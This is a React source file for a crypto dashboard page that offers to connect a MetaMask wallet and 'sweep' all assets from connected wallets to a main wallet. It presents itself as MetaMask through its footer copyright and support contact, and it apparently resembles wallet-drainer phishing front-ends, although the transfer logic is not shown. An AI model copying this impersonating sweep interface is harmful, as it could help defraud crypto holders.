import { useState } from "react";
import Sidebar from "@/components/sidebar";
import WalletConnectionModal from "@/components/wallet-connection-modal";
import SweepConfirmationModal from "@/components/sweep-confirmation-modal";
import TransactionProgressModal from "@/components/transaction-progress-modal";
import NetworkSelector from "@/components/network-selector";
import TokenPortfolio from "@/components/token-portfolio";
import { useWeb3 } from "@/hooks/useWeb3";
import { useWalletBalance } from "@/hooks/useWalletBalance";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { 
  Wallet, 
  TrendingUp, 
  Layers, 
  Zap,
  Menu,
  Repeat,
  Merge
} from "lucide-react";

export default function Dashboard() {
  const [showWalletModal, setShowWalletModal] = useState(false);
  const [showSweepModal, setShowSweepModal] = useState(false);
  const [showProgressModal, setShowProgressModal] = useState(false);
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const [selectedNetworks, setSelectedNetworks] = useState<string[]>(['ethereum']);

  const { 
    isConnected, 
    connectedWallets, 
    currentNetwork, 
    isConnecting, 
    connectMetaMask,
    supportedNetworks 
  } = useWeb3();

  const walletAddress = connectedWallets[0]?.address;
  const { 
    tokens, 
    wallets,
    totalPortfolioValue, 
    isLoading, 
    refreshBalances,
    getNetworkStats 
  } = useWalletBalance(walletAddress);

  const networkStats = getNetworkStats();
  const totalTokens = tokens.length;
  const totalWallets = wallets.length;

  const handleConnectWallet = () => {
    setShowWalletModal(true);
  };

  const handleStartSweep = () => {
    if (!isConnected) {
      setShowWalletModal(true);
      return;
    }
    setShowSweepModal(true);
  };

  const handleExecuteSweep = () => {
    setShowSweepModal(false);
    setShowProgressModal(true);
  };

  const getWalletStatus = () => {
    if (isConnecting) {
      return { text: "Connecting...", color: "bg-blue-500/20 text-blue-400" };
    }
    if (isConnected) {
      return { text: "Wallet Connected", color: "bg-green-500/20 text-green-400" };
    }
    return { text: "Wallet Disconnected", color: "bg-red-500/20 text-red-400" };
  };

  const walletStatus = getWalletStatus();

  return (
    <div className="min-h-screen bg-gradient-to-br from-dark-navy via-royal-blue to-dark-blue text-white">
      {/* Mobile Menu Button */}
      <Button
        variant="outline"
        size="icon"
        className="fixed top-5 left-5 z-50 bg-primary text-white border-primary hover:bg-primary/90 lg:hidden"
        onClick={() => setSidebarOpen(!sidebarOpen)}
      >
        <Menu className="w-6 h-6" />
      </Button>

      {/* Sidebar */}
      <Sidebar 
        isOpen={sidebarOpen}
        onClose={() => setSidebarOpen(false)}
        connectedWallets={connectedWallets}
      />

      {/* Main Content */}
      <main className="lg:ml-72 min-h-screen">
        {/* Header */}
        <header className="sticky top-0 z-30 bg-dark-navy/95 backdrop-blur-lg border-b border-royal-blue p-6">
          <div className="flex items-center justify-between">
            <div>
              <h1 className="text-2xl font-bold">Asset Management Dashboard</h1>
              <p className="text-gray-400">Manage and consolidate your crypto assets across multiple networks</p>
            </div>
            
            <div className="flex items-center gap-4">
              <Badge className={`${walletStatus.color} px-3 py-2 rounded-full text-sm font-medium`}>
                <div className={`w-2 h-2 rounded-full mr-2 ${isConnected ? 'bg-green-500' : 'bg-red-500'} ${isConnecting ? 'animate-pulse bg-blue-500' : ''}`} />
                {walletStatus.text}
              </Badge>
              
              <Button
                onClick={handleConnectWallet}
                className={`px-6 py-3 rounded-lg font-semibold flex items-center gap-2 transition-all transform hover:scale-105 shadow-lg ${
                  isConnected 
                    ? 'bg-green-500 hover:bg-green-600' 
                    : 'bg-primary hover:bg-primary/90'
                }`}
                disabled={isConnecting}
              >
                <Wallet className="w-5 h-5" />
                {isConnected ? 'Connected' : 'Connect Wallet'}
              </Button>
            </div>
          </div>
        </header>

        {/* Dashboard Content */}
        <div className="p-8">
          {/* Hero Section */}
          <div className="text-center mb-12">
            <h2 className="text-5xl font-bold mb-4 bg-gradient-to-r from-primary to-orange-400 bg-clip-text text-transparent">
              Complete Asset Control
            </h2>
            <p className="text-xl text-gray-300 max-w-2xl mx-auto">
              Sweep, consolidate, and manage your crypto assets across multiple wallets and networks with enterprise-grade security
            </p>
          </div>

          {/* Quick Stats */}
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-12">
            <Card className="stat-card bg-gradient-to-br from-dark-blue to-royal-blue border-gray-600/30 hover:border-primary/50">
              <CardContent className="p-6">
                <div className="flex items-center gap-4">
                  <div className="w-12 h-12 bg-primary/20 rounded-xl flex items-center justify-center">
                    <TrendingUp className="w-6 h-6 text-primary" />
                  </div>
                  <div>
                    <p className="text-3xl font-bold text-white">
                      ${totalPortfolioValue || '0.00'}
                    </p>
                    <p className="text-sm text-gray-400">Total Portfolio Value</p>
                  </div>
                </div>
              </CardContent>
            </Card>

            <Card className="stat-card bg-gradient-to-br from-dark-blue to-royal-blue border-gray-600/30 hover:border-primary/50">
              <CardContent className="p-6">
                <div className="flex items-center gap-4">
                  <div className="w-12 h-12 bg-green-500/20 rounded-xl flex items-center justify-center">
                    <Wallet className="w-6 h-6 text-green-500" />
                  </div>
                  <div>
                    <p className="text-3xl font-bold text-white">{totalWallets}</p>
                    <p className="text-sm text-gray-400">Connected Wallets</p>
                  </div>
                </div>
              </CardContent>
            </Card>

            <Card className="stat-card bg-gradient-to-br from-dark-blue to-royal-blue border-gray-600/30 hover:border-primary/50">
              <CardContent className="p-6">
                <div className="flex items-center gap-4">
                  <div className="w-12 h-12 bg-blue-500/20 rounded-xl flex items-center justify-center">
                    <Layers className="w-6 h-6 text-blue-500" />
                  </div>
                  <div>
                    <p className="text-3xl font-bold text-white">{totalTokens}</p>
                    <p className="text-sm text-gray-400">Total Tokens</p>
                  </div>
                </div>
              </CardContent>
            </Card>

            <Card className="stat-card bg-gradient-to-br from-dark-blue to-royal-blue border-gray-600/30 hover:border-primary/50">
              <CardContent className="p-6">
                <div className="flex items-center gap-4">
                  <div className="w-12 h-12 bg-purple-500/20 rounded-xl flex items-center justify-center">
                    <Zap className="w-6 h-6 text-purple-500" />
                  </div>
                  <div>
                    <p className="text-3xl font-bold text-white">
                      {selectedNetworks.length}
                    </p>
                    <p className="text-sm text-gray-400">Active Networks</p>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>

          {/* Network Selection & Actions */}
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 mb-12">
            <NetworkSelector
              supportedNetworks={supportedNetworks}
              selectedNetworks={selectedNetworks}
              onNetworkToggle={(networkId) => {
                setSelectedNetworks(prev => 
                  prev.includes(networkId) 
                    ? prev.filter(id => id !== networkId)
                    : [...prev, networkId]
                );
              }}
              networkStats={networkStats}
              onScanNetworks={() => refreshBalances()}
            />

            {/* Quick Actions */}
            <div className="space-y-6">
              <Card className="action-card bg-gradient-to-br from-green-500/10 to-emerald-600/10 border-green-500/20 hover:border-green-500/40 cursor-pointer group">
                <CardContent className="p-8">
                  <div className="flex items-center gap-4 mb-4">
                    <div className="w-16 h-16 bg-green-500/20 rounded-2xl flex items-center justify-center group-hover:scale-110 transition-transform">
                      <Repeat className="w-8 h-8 text-green-500" />
                    </div>
                    <div>
                      <h3 className="text-xl font-bold">Sweep All Wallets</h3>
                      <p className="text-gray-400">Transfer all assets to main wallet</p>
                    </div>
                  </div>
                  <Button 
                    onClick={handleStartSweep}
                    className="w-full bg-green-500 hover:bg-green-600 text-white py-3 px-6 rounded-xl font-semibold"
                  >
                    Start Full Sweep
                  </Button>
                </CardContent>
              </Card>

              <Card className="action-card bg-gradient-to-br from-blue-500/10 to-indigo-600/10 border-blue-500/20 hover:border-blue-500/40 cursor-pointer group">
                <CardContent className="p-8">
                  <div className="flex items-center gap-4 mb-4">
                    <div className="w-16 h-16 bg-blue-500/20 rounded-2xl flex items-center justify-center group-hover:scale-110 transition-transform">
                      <Merge className="w-8 h-8 text-blue-500" />
                    </div>
                    <div>
                      <h3 className="text-xl font-bold">Consolidate Assets</h3>
                      <p className="text-gray-400">Merge similar tokens across wallets</p>
                    </div>
                  </div>
                  <Button 
                    onClick={handleStartSweep}
                    className="w-full bg-blue-500 hover:bg-blue-600 text-white py-3 px-6 rounded-xl font-semibold"
                  >
                    Consolidate Now
                  </Button>
                </CardContent>
              </Card>
            </div>
          </div>

          {/* Token Portfolio */}
          <TokenPortfolio 
            tokens={tokens}
            isLoading={isLoading}
            onRefresh={refreshBalances}
            onSweepToken={(token) => {
              // Set up sweep for specific token
              setShowSweepModal(true);
            }}
          />
        </div>
      </main>

      {/* Crypto Platform Section */}
      <div className="bg-gradient-to-br from-orange-400 via-red-400 to-pink-400 py-20 min-h-screen">
        <div className="max-w-6xl mx-auto px-8">
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
            {/* Buy Crypto Card */}
            <div className="bg-white bg-opacity-95 rounded-3xl p-10 pr-44 relative overflow-hidden shadow-2xl backdrop-blur transform hover:scale-105 hover:-translate-y-2 transition-all duration-300 min-h-72 flex flex-col justify-center">
              <div>
                <h2 className="text-slate-700 text-4xl font-bold mb-4 leading-tight">
                  Buy and<br />sell crypto
                </h2>
                <p className="text-slate-600 text-lg mb-6 opacity-80 leading-relaxed">
                  Go from cash to crypto in seconds with our secure payment methods.
                </p>
                <button 
                  onClick={() => !isConnected ? setShowWalletModal(true) : null}
                  className="bg-white text-slate-700 px-8 py-4 rounded-xl font-bold text-sm uppercase tracking-wide shadow-lg hover:shadow-xl hover:-translate-y-1 transition-all duration-300 hover:bg-blue-50"
                >
                  {isConnected ? 'COMING SOON' : 'CONNECT WALLET'}
                </button>
              </div>
              <div className="absolute right-5 top-1/2 transform -translate-y-1/2 w-40 h-40 bg-gradient-to-br from-orange-500 to-yellow-500 rounded-full opacity-90" 
                   style={{ borderRadius: '50% 20% 50% 20%' }}>
                <div className="absolute top-6 left-6 w-8 h-8 bg-gradient-to-br from-blue-500 to-purple-500 rounded-full"></div>
                <div className="absolute bottom-8 right-8 w-6 h-6 bg-gradient-to-br from-green-500 to-teal-500 rounded-full"></div>
              </div>
            </div>

            {/* Swap Tokens Card */}
            <div className="bg-white bg-opacity-95 rounded-3xl p-10 pr-44 relative overflow-hidden shadow-2xl backdrop-blur transform hover:scale-105 hover:-translate-y-2 transition-all duration-300 min-h-72 flex flex-col justify-center">
              <div>
                <h2 className="text-slate-700 text-4xl font-bold mb-4 leading-tight">
                  Swap and bridge<br />tokens
                </h2>
                <p className="text-slate-600 text-lg mb-6 opacity-80 leading-relaxed">
                  Easily swap thousands of tokens across dozens of networks with the best rates.
                </p>
                <button 
                  onClick={() => !isConnected ? setShowWalletModal(true) : null}
                  className="bg-white text-slate-700 px-8 py-4 rounded-xl font-bold text-sm uppercase tracking-wide shadow-lg hover:shadow-xl hover:-translate-y-1 transition-all duration-300 hover:bg-blue-50"
                >
                  {isConnected ? 'COMING SOON' : 'CONNECT WALLET'}
                </button>
              </div>
              <div className="absolute right-5 top-1/2 transform -translate-y-1/2 rotate-12 w-40 h-40 bg-gradient-to-br from-teal-500 to-cyan-400 rounded-3xl opacity-90 relative">
                <div className="absolute top-5 right-5 w-12 h-12 bg-gradient-to-br from-pink-500 to-red-500 rounded-2xl"></div>
                <div className="absolute bottom-6 left-6 w-9 h-9 bg-gradient-to-br from-yellow-400 to-orange-500 rounded-full"></div>
              </div>
            </div>

            {/* Earn Rewards Card */}
            <div className="bg-white bg-opacity-95 rounded-3xl p-10 pr-44 relative overflow-hidden shadow-2xl backdrop-blur transform hover:scale-105 hover:-translate-y-2 transition-all duration-300 min-h-72 flex flex-col justify-center">
              <div>
                <h2 className="text-slate-700 text-4xl font-bold mb-4 leading-tight">
                  Earn yield<br />on your crypto
                </h2>
                <p className="text-slate-600 text-lg mb-6 opacity-80 leading-relaxed">
                  Stake your tokens and earn passive income through various DeFi protocols.
                </p>
                <button 
                  onClick={() => !isConnected ? setShowWalletModal(true) : null}
                  className="bg-white text-slate-700 px-8 py-4 rounded-xl font-bold text-sm uppercase tracking-wide shadow-lg hover:shadow-xl hover:-translate-y-1 transition-all duration-300 hover:bg-blue-50"
                >
                  {isConnected ? 'COMING SOON' : 'CONNECT WALLET'}
                </button>
              </div>
              <div className="absolute right-5 top-1/2 transform -translate-y-1/2 w-40 h-40 bg-gradient-to-br from-purple-600 to-violet-500 opacity-90 relative"
                   style={{ borderRadius: '30% 70% 30% 70%' }}>
                <div className="absolute top-7 left-7 w-11 h-11 bg-gradient-to-br from-orange-500 to-red-500 rounded-lg"
                     style={{ borderRadius: '20% 80% 20% 80%' }}></div>
                <div className="absolute bottom-10 right-10 w-7 h-7 bg-gradient-to-br from-sky-400 to-blue-600 rounded-full"></div>
              </div>
            </div>

            {/* MetaMask Card */}
            <div className="bg-white bg-opacity-95 rounded-3xl p-10 pr-44 relative overflow-hidden shadow-2xl backdrop-blur transform hover:scale-105 hover:-translate-y-2 transition-all duration-300 min-h-72 flex flex-col justify-center">
              <div>
                <h2 className="text-slate-700 text-4xl font-bold mb-4 leading-tight">
                  Spend with<br />MetaMask Card
                </h2>
                <p className="text-slate-600 text-lg mb-6 opacity-80 leading-relaxed">
                  Get your MetaMask Card and spend crypto anywhere Mastercard is accepted.
                </p>
                <button 
                  onClick={() => !isConnected ? setShowWalletModal(true) : null}
                  className="bg-white text-slate-700 px-8 py-4 rounded-xl font-bold text-sm uppercase tracking-wide shadow-lg hover:shadow-xl hover:-translate-y-1 transition-all duration-300 hover:bg-blue-50"
                >
                  {isConnected ? 'COMING SOON' : 'CONNECT WALLET'}
                </button>
              </div>
              <div className="absolute right-5 top-1/2 transform -translate-y-1/2 -rotate-12 w-36 h-24 bg-gradient-to-br from-red-500 to-red-700 rounded-2xl opacity-90 relative">
                <div className="absolute top-5 left-5 text-white font-bold text-xs tracking-wider">METAMASK</div>
                <div className="absolute bottom-5 right-5 w-8 h-6 bg-gradient-to-br from-yellow-400 to-orange-500 rounded"></div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="bg-gradient-to-br from-dark-navy to-dark-blue text-white py-16 border-t-4 border-primary">
        <div className="max-w-6xl mx-auto px-8 text-center">
          <p className="text-lg leading-relaxed mb-10 text-gray-300 max-w-2xl mx-auto">
            Your gateway to the decentralized web. MetaMask is a secure and user-friendly wallet that connects you to blockchain applications with complete self-custody of your digital assets.
          </p>
          
          <div className="flex justify-center items-center gap-16 flex-wrap mb-10">
            <div className="flex items-center gap-3 text-primary hover:text-orange-400 transition-colors cursor-pointer hover:-translate-y-1 transform duration-300">
              <svg className="w-6 h-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
                <polyline points="22,6 12,13 2,6"></polyline>
              </svg>
              <span className="font-medium">support@metamask.io</span>
            </div>
            
            <div className="flex items-center gap-3 text-primary hover:text-orange-400 transition-colors cursor-pointer hover:-translate-y-1 transform duration-300">
              <svg className="w-6 h-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
              </svg>
              <span className="font-medium">metamask.io</span>
            </div>
            
            <div className="flex items-center gap-3 text-primary hover:text-orange-400 transition-colors cursor-pointer hover:-translate-y-1 transform duration-300">
              <svg className="w-6 h-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"></path>
              </svg>
              <span className="font-medium">Join our community</span>
            </div>
          </div>
          
          <div className="border-t border-gray-600 pt-8">
            <p className="text-gray-400 text-sm">
              © 2024 MetaMask. All rights reserved. | Built with security and privacy in mind.
            </p>
          </div>
        </div>
      </footer>

      {/* Modals */}
      <WalletConnectionModal
        isOpen={showWalletModal}
        onClose={() => setShowWalletModal(false)}
        onConnectMetaMask={connectMetaMask}
        isConnecting={isConnecting}
      />

      <SweepConfirmationModal
        isOpen={showSweepModal}
        onClose={() => setShowSweepModal(false)}
        onExecute={handleExecuteSweep}
        tokens={tokens}
        selectedNetworks={selectedNetworks}
        connectedWallets={connectedWallets}
      />

      <TransactionProgressModal
        isOpen={showProgressModal}
        onClose={() => setShowProgressModal(false)}
        status="pending"
      />
    </div>
  );
}
